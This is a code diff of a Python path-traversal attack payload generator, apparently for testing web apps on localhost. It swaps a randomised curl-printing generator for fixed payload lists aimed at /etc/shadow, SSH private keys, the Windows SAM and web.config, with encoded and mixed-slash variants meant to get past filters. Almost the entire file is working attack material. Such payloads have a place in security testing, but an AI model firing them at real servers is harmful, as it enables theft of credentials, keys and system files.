@@ -1,79 +1,57 @@
+"""
+tools/pathT_atk.py — Path Traversal attack payload generator
+"""
 import random
-import urllib.parse
 
-TARGET = "http://localhost/test?"
-
-PARAMS = [
-    "file", "path", "page", "doc",
-    "template", "load", "view", "resource"
+_LINUX_BASIC = [
+    "../../../../etc/passwd",
+    "../../../etc/passwd",
+    "../../../../../../etc/shadow",
+    "../../../../proc/self/environ",
+    "../../../../var/log/auth.log",
+    "../../../../home/user/.ssh/id_rsa",
 ]
 
-TRAVERSAL_PATTERNS = [
-    "../",
-    "..\\",
-    "../../",
-    "..\\..\\",
-    "../../../",
-    "..\\..\\..\\"
+_WINDOWS_BASIC = [
+    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+    "..\\..\\..\\boot.ini",
+    "..\\..\\..\\windows\\win.ini",
+    "..\\..\\..\\inetpub\\wwwroot\\web.config",
+    "../../../../Windows/System32/config/SAM",
 ]
 
-SENSITIVE_FILES = [
-    "etc/passwd",
-    "etc/shadow",
-    "proc/self/environ",
-    "windows/system32/drivers/etc/hosts",
-    "boot.ini",
-    "win.ini"
+_URL_ENCODED = [
+    "..%2F..%2F..%2Fetc%2Fpasswd",
+    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "..%252f..%252fetc%252fpasswd",  # double-encoded
+    "..%c0%af..%c0%afetc%c0%afpasswd",  # overlong UTF-8
+    "%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
 ]
 
-def random_case(s):
-    return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in s)
+_MIXED_SLASHES = [
+    "..\\/../etc/passwd",
+    "..\\/..\\/../etc/passwd",
+    "....//....//etc/passwd",
+    "....\\\\....\\\\etc\\\\passwd",
+]
 
-def maybe_encode(s):
-    if random.random() > 0.5:
-        s = urllib.parse.quote(s)
-    if random.random() > 0.7:
-        s = urllib.parse.quote(s)
-    return s
+_ABSOLUTE = [
+    "/etc/passwd",
+    "/etc/shadow",
+    "/proc/version",
+    "C:\\Windows\\win.ini",
+    "/var/www/html/config.php",
+]
 
-def maybe_null_byte(s):
-    if random.random() > 0.7:
-        s += "%00"
-    return s
+ALL_PAYLOADS = _LINUX_BASIC + _WINDOWS_BASIC + _URL_ENCODED + _MIXED_SLASHES + _ABSOLUTE
 
-def maybe_noise_wrap(s):
-    wrappers = [
-        lambda x: x,
-        lambda x: "abc" + x,
-        lambda x: x + "123",
-        lambda x: "test" + x + "data"
-    ]
-    return random.choice(wrappers)(s)
+PT_PATHS  = ["/files", "/static", "/assets", "/download", "/images", "/docs", "/view"]
+PT_PARAMS = ["path", "file", "dir", "folder", "resource", "img", "doc"]
 
-def generate_payload():
-    traversal = random.choice(TRAVERSAL_PATTERNS)
-    depth = random.randint(1, 3)
-    chain = traversal * depth
-    file = random.choice(SENSITIVE_FILES)
 
-    payload = chain + file
-
-    if random.random() > 0.5:
-        payload = random_case(payload)
-
-    payload = maybe_null_byte(payload)
-    payload = maybe_noise_wrap(payload)
-    payload = maybe_encode(payload)
-
-    return payload
-
-generated = set()
-
-while len(generated) < 100:
-    param = random.choice(PARAMS)
-    payload = generate_payload()
-    curl_cmd = f'curl "{TARGET}{param}={payload}"'
-    generated.add(curl_cmd)
-
-for cmd in generated:
-    print(cmd)
+def generate() -> tuple[str, str]:
+    payload = random.choice(ALL_PAYLOADS)
+    path    = random.choice(PT_PATHS)
+    param   = random.choice(PT_PARAMS)
+    url     = f"http://localhost:8000{path}?{param}={payload}"
+    return url, payload
